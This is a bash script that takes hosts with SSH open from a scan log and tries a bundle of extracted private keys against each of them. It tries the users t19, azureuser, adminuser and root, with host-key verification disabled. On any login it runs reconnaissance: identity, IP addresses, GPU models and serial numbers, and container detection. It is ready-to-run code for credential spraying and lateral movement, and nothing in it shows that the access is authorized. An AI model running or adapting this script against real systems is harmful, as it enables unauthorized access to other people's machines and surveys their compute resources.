#!/usr/bin/env bash
# estate SSH reachability ladder, run from the AS8075 runner vantage
set -u
echo "SSH_STEP_START $(date -u +%FT%TZ)"
echo "SSH_BIN=$(command -v ssh) VERSION=$(ssh -V 2>&1)"
mkdir -p kh
tar xzf keys/kh.b64 -C kh 2>/dev/null || true
chmod 755 kh 2>/dev/null || true
chmod 600 kh/* 2>/dev/null || true
echo "KEYS_KH=$(ls kh | wc -l) KEYS_K2=$(ls k2 2>/dev/null | wc -l)"

ips=$(awk -F'\t' '$1=="MATRIX" && $3=="22" && $4=="OPEN"{print $2}' probe.log | sort -u)
echo "SSH_OPEN_IPS=$(echo "$ips" | wc -w): $(echo $ips)"

for ip in $ips; do
  echo "== host $ip =="
  out=$(timeout 12 ssh -n -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=8 -o PreferredAuthentications=none "t19@$ip" true 2>&1 | tr '\n' ';' | head -c 300)
  echo -e "SSH_METHODS\t$ip\t$out"
  mapfile -t KF < <( (find kh -maxdepth 1 -type f -name 'k*'; find k2 -maxdepth 1 -type f) | sort)
  echo "KEYFILES=${#KF[@]}"
  for k in "${KF[@]}"; do
    for u in t19 azureuser adminuser root; do
      out=$(timeout 12 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=publickey \
            -o IdentitiesOnly=yes \
            "$u@$ip" 'id; hostname -I; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial --format=csv; cat /proc/1/cgroup' 2>&1 | tr '\n' ';' | head -c 400)
      case "$out" in
        *"Permission denied"*|*"Connection"*|*"closed"*|*"timed out"*|*"refused"*|*"not accessible"*|*"reset by peer"*)
          echo -e "SSH_FAIL\t$ip\t$u\t$(basename $k)\t${out:0:160}" ;;
        *)
          echo -e "SSH_HIT\t$ip\t$u\t$(basename $k)\t$out" ;;
      esac
      sleep 0.3
    done
  done
done
echo "SSH_STEP_END $(date -u +%FT%TZ)"
